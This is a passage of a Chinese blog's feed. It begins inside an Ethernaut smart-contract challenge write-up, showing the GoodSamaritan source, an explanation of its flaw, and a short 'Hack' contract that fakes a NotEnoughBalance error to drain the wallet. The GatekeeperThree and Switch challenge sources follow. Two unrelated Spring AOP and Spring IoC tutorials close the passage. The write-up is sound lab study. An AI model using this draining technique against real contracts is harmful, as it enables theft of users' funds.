notify contract <br>                INotifyable(dest_).notify(amount_);<br>            &#125;<br>        &#125; else &#123;<br>            revert InsufficientBalance(currentBalance, amount_);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Wallet &#123;<br>    // The owner of the wallet instance<br>    address public owner;<br><br>    Coin public coin;<br><br>    error OnlyOwner();<br>    error NotEnoughBalance();<br><br>    modifier onlyOwner() &#123;<br>        if(msg.sender != owner) &#123;<br>            revert OnlyOwner();<br>        &#125;<br>        _;<br>    &#125;<br><br>    constructor() &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function donate10(address dest_) external onlyOwner &#123;<br>        // check balance left<br>        if (coin.balances(address(this)) &lt; 10) &#123;<br>            revert NotEnoughBalance();<br>        &#125; else &#123;<br>            // donate 10 coins<br>            coin.transfer(dest_, 10);<br>        &#125;<br>    &#125;<br><br>    function transferRemainder(address dest_) external onlyOwner &#123;<br>        // transfer balance left<br>        coin.transfer(dest_, coin.balances(address(this)));<br>    &#125;<br><br>    function setCoin(Coin coin_) external onlyOwner &#123;<br>        coin = coin_;<br>    &#125;<br>&#125;<br><br>interface INotifyable &#123;<br>    function notify(uint256 amount) external;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看GoodSamaritan合约，只有一个可调用方法requestDonation，以及在构造函数中创建了我们需要的Wallet和coin，这也限制了无法直接调用Wallet、coin中的方法。</p><p>接着看requestDonation方法，他会通过wallet进行捐赠10金额给msg.sender，那我们进入Wallet中，调用donate10函数会先查看coin中wallet是否还有10金额的余额，如果没有会抛出一个<code>NotEnoughBalance()</code>错误，否则才会调用coin的transfer进行转账，</p><p>接着又进入到coin中，transfer函数中<code>currentBalance = balances[msg.sender]</code>这一句代码也指示了我们需要通过wallet执行transfer，这样currentBalance才是我们的钱包余额。才能继续后面的操作：正常的余额增减，之后对我们传入的地址进行了一个是否是合约的判断：如果是将会转为<code>INotifyable</code>，调用notify函数；如果不是将会正常执行完交易，这就是整个requestDonation的流程，接着看catch的部分：</p><p>如果接受到前面<code>NotEnoughBalance()</code>的错误，将会执行wallet的transferRemainder，而这个函数能够把wallet所有的coin全部转走。</p><p>因此，我们要想一步转走这些余额，就必须通过transferRemainder来实现，也就是：通过一个合约，来正常调用requestDonation，然后在coin中进行transfer的时候，通过接口<code>INotifyable</code>的notify方法返回一个<code>NotEnoughBalance()</code>的错误，这样我们就由transferRemainder再一次进入coin的transfer中，而这一次我们就不需要返回错误，正常交易就行，因此对notify要求有条件性：当提款金额是10的时候抛出错误。这样就ok了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IGood &#123;<br>    function requestDonation() external returns(bool enoughBalance);<br>    function coin() external returns (address);<br>    function wallet() external returns (address);<br>&#125;<br><br>interface Icoin &#123;<br>  function balance() external returns (uint256);<br>&#125;<br><br>contract Hack &#123;<br>  error NotEnoughBalance();<br><br>  constructor(IGood target) &#123;<br>    target.requestDonation();<br>  &#125;<br><br>  function notify(uint256 amount) external &#123;<br>    if (amount == 10) &#123;<br>      revert NotEnoughBalance();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="GatekeeperThree"><a href="#GatekeeperThree" class="headerlink" title="GatekeeperThree"></a>GatekeeperThree</h1><p>任务要求：</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract SimpleTrick &#123;<br>  GatekeeperThree public target;<br>  address public trick;<br>  uint private password = block.timestamp;<br><br>  constructor (address payable _target) &#123;<br>    target = GatekeeperThree(_target);<br>  &#125;<br>    <br>  function checkPassword(uint _password) public returns (bool) &#123;<br>    if (_password == password) &#123;<br>      return true;<br>    &#125;<br>    password = block.timestamp;<br>    return false;<br>  &#125;<br>    <br>  function trickInit() public &#123;<br>    trick = address(this);<br>  &#125;<br>    <br>  function trickyTrick() public &#123;<br>    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;<br>      target.getAllowance(password);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract GatekeeperThree &#123;<br>  address public owner;<br>  address public entrant;<br>  bool public allowEntrance;<br><br>  SimpleTrick public trick;<br><br>  function construct0r() public &#123;<br>      owner = msg.sender;<br>  &#125;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender == owner);<br>    require(tx.origin != owner);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(allowEntrance == true);<br>    _;<br>  &#125;<br><br>  modifier gateThree() &#123;<br>    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;<br>      _;<br>    &#125;<br>  &#125;<br><br>  function getAllowance(uint _password) public &#123;<br>    if (trick.checkPassword(_password)) &#123;<br>        allowEntrance = true;<br>    &#125;<br>  &#125;<br><br>  function createTrick() public &#123;<br>    trick = new SimpleTrick(payable(address(this)));<br>    trick.trickInit();<br>  &#125;<br><br>  function enter() public gateOne gateTwo gateThree &#123;<br>    entrant = tx.origin;<br>  &#125;<br><br>  receive () external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h1><p>任务要求：</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Switch &#123;<br>    bool public switchOn; // switch is off<br>    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));<br><br>     modifier onlyThis() &#123;<br>        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);<br>        _;<br>    &#125;<br><br>    modifier onlyOff() &#123;<br>        // we use a complex data type to put in memory<br>        bytes32[1] memory selector;<br>        // check that the calldata at position 68 (location of _data)<br>        assembly &#123;<br>            calldatacopy(selector, 68, 4) // grab function selector from calldata<br>        &#125;<br>        require(<br>            selector[0] == offSelector,<br>            &quot;Can only call the turnOffSwitch function&quot;<br>        );<br>        _;<br>    &#125;<br><br>    function flipSwitch(bytes memory _data) public onlyOff &#123;<br>        (bool success, ) = address(this).call(_data);<br>        require(success, &quot;call failed :(&quot;);<br>    &#125;<br><br>    function turnSwitchOn() public onlyThis &#123;<br>        switchOn = true;<br>    &#125;<br><br>    function turnSwitchOff() public onlyThis &#123;<br>        switchOn = false;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;此文章会记录在Ethernaut上经历的题。&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://lexlady.top/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethernaut" scheme="http://lexlady.top/tags/Ethernaut/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
    <category term="Remix" scheme="http://lexlady.top/tags/Remix/"/>
    
  </entry>
  
  <entry>
    <title>SpringAOP</title>
    <link href="http://lexlady.top/2022/12/26/SprintBoot/SpringAOP/"/>
    <id>http://lexlady.top/2022/12/26/SprintBoot/SpringAOP/</id>
    <published>2022-12-26T15:53:12.000Z</published>
    <updated>2023-05-23T06:04:38.583Z</updated>
    
    <content type="html"><![CDATA[<p>Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。</p><span id="more"></span><h1 id="Spring-AOP的基本概念"><a href="#Spring-AOP的基本概念" class="headerlink" title="Spring AOP的基本概念"></a>Spring AOP的基本概念</h1><h2 id="AOP的概念"><a href="#AOP的概念" class="headerlink" title="AOP的概念"></a>AOP的概念</h2><p>AOP（Aspect-Oriented Programming）即面向切面编程，相应的就是OOP，面向对象编程。在OOP中，以类作为程序的基本单位，而在AOP中则是以切面作为基本单位。  </p><blockquote><p>在业务处理功能中，通常都有日志记录、事务处理、异常处理等操作，如果是使用OOP可以通过封装或继承的方法实现代码重写来应用到多个业务中，但仍存在同样的代码分散到各个方法中。<br>因此，AOP采取横向抽取机制，将分散在各个方法中的重复代码提取出来，然后在程序编译或运行阶段，再将抽取出来的代码应用到需要执行的地方。  </p></blockquote><p>传统的OOP是无法实现这样的横向抽取机制，因为OOP实现的是父子的纵向重用。但AOP并不是OOP的替代品，而是对OOP的一种补充，进而相辅相成。</p><h2 id="AOP的基本术语"><a href="#AOP的基本术语" class="headerlink" title="AOP的基本术语"></a>AOP的基本术语</h2><ol><li>切面（Aspect）<br>指封装横切到系统功能的类  </li><li>连接点（Joinpoint）<br>指程序运行中的一些时间点（如方法的调用或异常的抛出）  </li><li>切入点（Pointcut）<br>指那些需要处理的连接点，在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息，用来修饰连接点，确定哪些连接点需要被处理。  </li><li>通知（增强处理）<br>由切面添加到特点的连接点（满足切入点规则）的一段代码，</li><li>引入（Introduction）<br>允许在现有的实现类中添加自定义的方法和属性  </li><li>目标对象（Target Object）<br>指所有被通知的对象。</li><li>代理（Proxy）<br>是通知应用到目标对象后，被动态创建的对象</li><li>织入（Weaving）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。&lt;/p&gt;</summary>
    
    
    
    <category term="Spring Boot" scheme="http://lexlady.top/categories/Spring-Boot/"/>
    
    
    <category term="教程" scheme="http://lexlady.top/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>SpringIoC</title>
    <link href="http://lexlady.top/2022/12/01/SprintBoot/SpringIoC/"/>
    <id>http://lexlady.top/2022/12/01/SprintBoot/SpringIoC/</id>
    <published>2022-12-01T13:43:42.000Z</published>
    <updated>2023-07-27T01:52:02.662Z</updated>
    
    <content type="html"><![CDATA[<p>简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？</p><span id="more"></span><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>下面从一个生活实例对控制反转进行解释（也称依赖注入(Dependency Injection,DI)，只是执行角度不同，是同一个概念）</p><blockquote><p>如果我们要吃饭，就可以有两种选择：一是自己做；另一种是下馆子。当我们要自己做时，就需要自己准备食材、进行烹饪。而下馆子只需要根据自己的需要让店家提供。<br>控制反转的思想便包含在了上述的例子中：<strong>将执行操作交给Spring容器</strong>。<br>由容器控制对象的创建以及查找并注入依赖的资源，而资源则集中管理，<u>实现资源的可配置和易管理</u>，<em>降低了使用资源双方的依赖程度，松耦合</em></p></blockquote><h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><blockquote><p>在Spring框架中，仅管使用XML配置文件可以很简单地装配Bean，但对于需要配置大量的Bean时，其XML文件会过于庞大，不方便维护。  </p></blockquote><p><strong>因此推荐使用注解(annotation)的方式去装配Bean</strong></p><h2 id="声明Bean的注解"><a href="#声明Bean的注解" class="headerlink" title="声明Bean的注解"></a>声明Bean的注解</h2><ol><li>@Component</li></ol><ul><li>表示一个组件对象(Bean)</li><li>作用于任何层次上</li><li>无明确角色</li><li>一个泛化的概念</li></ul><ol start="2"><li>@Repository</li></ol><ul><li>将数据访问层(Dao)的类标识为Bean</li><li>功能与@Component相同</li></ul><ol start="3"><li>@Service</li></ol><ul><li>标注一个业务逻辑组件类（Service）</li><li>功能与@Component相同</li></ul><ol start="4"><li>@Controller</li></ol><ul><li>用于标注一个控制器组件类（Spring MVC 的Controller）</li><li>功能与@Component相同</li></ul><h2 id="注入Bean的注解"><a href="#注入Bean的注解" class="headerlink" title="注入Bean的注解"></a>注入Bean的注解</h2><ol><li>@Autowired</li></ol><ul><li>可以对类成员变量、方法及构造方法进行标注，完成自动装配的工作</li><li>消除setter getter方法</li></ul><ol start="2"><li>@Resource</li></ol><ul><li>与@Autowired功能一样</li><li>区别：默认是按照名称来装配注入的，只有当找不到与名称匹配的Bean时才会按照类型来装配注入；</li><li>@Recourse的两个属性：<ul><li>name：指定Bean实例名称</li><li>type：指定Bean类型</li></ul></li></ul><ol start="3"><li>@Qualifier</li></ol><ul><li>与@Autowired注解配合使用。当@Autowired需要按照名称来装配注入时，则使用@Qualifier</li></ul><p>Spring IoC容器（ApplicationContext）负责创建和注入Bean。Spring提供使用XML配置、注解、Java配置以及groovy配置实现Bean的创建和注入。</p><h1 id="实例一-（基于注解的依赖注入）"><a href="#实例一-（基于注解的依赖注入）" class="headerlink" title="实例一 （基于注解的依赖注入）"></a>实例一 （基于注解的依赖注入）</h1><blockquote><p>步骤：<br>创建Web应用，导入jar包（Spring4件套、第三方依赖包和spring-aop（用于扫描注解））<br>创建Annotation包<br>在该包下创建DAO层<br>在该包下创建Service层<br>在该包下创建Controller层<br>创建配置类<br>创建测试类</p></blockquote><h3 id="Dao层代码"><a href="#Dao层代码" class="headerlink" title="Dao层代码"></a>Dao层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Repository</span><br><span class="hljs-comment">//等价于@Repository(name = &quot;theDao&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testDao save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Service层代码"><a href="#Service层代码" class="headerlink" title="Service层代码"></a>Service层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Service</span><br><span class="hljs-comment">//相当于@Service(&quot;theService&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theService</span> &#123;<br>    <span class="hljs-meta">@Resource(name = &quot;theDao&quot;)</span><br>    <span class="hljs-comment">//相当于@Autowired，</span><br>    <span class="hljs-keyword">private</span> theDao testDao;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testService save&quot;</span>);<br>        testDao.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Controller层代码"><a href="#Controller层代码" class="headerlink" title="Controller层代码"></a>Controller层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> theService testService;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testService.save();<br>        System.out.println(<span class="hljs-string">&quot;testController save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Configuration</span>  <span class="hljs-comment">//声明当前类是配置类，相当于一个XML文件</span><br><span class="hljs-meta">@ComponentScan(&quot;annotation&quot;)</span>    <span class="hljs-comment">//自动扫描当前包下使用的注解，并注册为Bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Configannotation</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestAnnotation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AnnotationConfigApplicationContext</span> <span class="hljs-variable">appCon</span> <span class="hljs-operator">=</span> <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Configannotation.class);<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>appCon.getBean(theController.class);<br>        tc.save();<br>        appCon.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="实例二-（Java配置）"><a href="#实例二-（Java配置）" class="headerlink" title="实例二 （Java配置）"></a>实例二 （Java配置）</h1><p>Java配置是通过@Configuration和@Bean来实现的  </p><blockquote><p>@Configuration声明当前类作为一个配置类<br>@Bean注解在方法上，声明当前方法的返回值为一个Bean</p></blockquote><h3 id="Dao层代码-1"><a href="#Dao层代码-1" class="headerlink" title="Dao层代码"></a>Dao层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testDao save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Service层代码-1"><a href="#Service层代码-1" class="headerlink" title="Service层代码"></a>Service层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theService</span> &#123;<br>    theDao testDao;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTestDao</span><span class="hljs-params">(theDao testDao)</span>&#123;<br>        <span class="hljs-built_in">this</span>.testDao = testDao;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testDao.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Controller层代码-1"><a href="#Controller层代码-1" class="headerlink" title="Controller层代码"></a>Controller层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    theService testService;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTestService</span><span class="hljs-params">(theService testService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.testService = testService;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testService.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置类-1"><a href="#配置类-1" class="headerlink" title="配置类"></a>配置类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Configuration</span>  <span class="hljs-comment">//声明当前类是配置类，相当于一个XML文件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Configannotation</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theDao <span class="hljs-title function_">getTestDao</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theDao</span>();<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theService <span class="hljs-title function_">getTestService</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">theService</span> <span class="hljs-variable">ts</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theService</span>();<br>        ts.setTestDao(getTestDao());<br>        <span class="hljs-keyword">return</span> ts;<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theController <span class="hljs-title function_">getTestController</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">ts</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theController</span>();<br>        ts.setTestService(getTestService());<br>        <span class="hljs-keyword">return</span> ts;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试类-1"><a href="#测试类-1" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestConfig</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//初始化Spring容器ApplicationContext</span><br>        <span class="hljs-type">AnnotationConfigApplicationContext</span> <span class="hljs-variable">appCon</span> <span class="hljs-operator">=</span> <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Configannotation.class);<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>appCon.getBean(theController.class);<br>        tc.save();<br>        appCon.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>控制反转是一种通过描述（可以是xml或注解）并通过第三方产生或获取特定对象的方式。<ul><li>在Spring中实现控制反转的是IoC容器</li><li>实现方法是依赖注入</li></ul></li><li>常用注解</li><li>两种Bean的创建和注入：通过对比可以看出，有时候使用Java配置反而更加繁琐。<ul><li>全局配置尽量使用Java配置</li><li>业务Bean的配置尽量使用注解配置</li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？&lt;/p&gt;</summary>
    
    
    
    <category term="Spring Boot" scheme="http://lexlady.top/categories/Spring-Boot/"/>
    
    
    <category term="教程" scheme="http://lexlady.top/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
</feed>
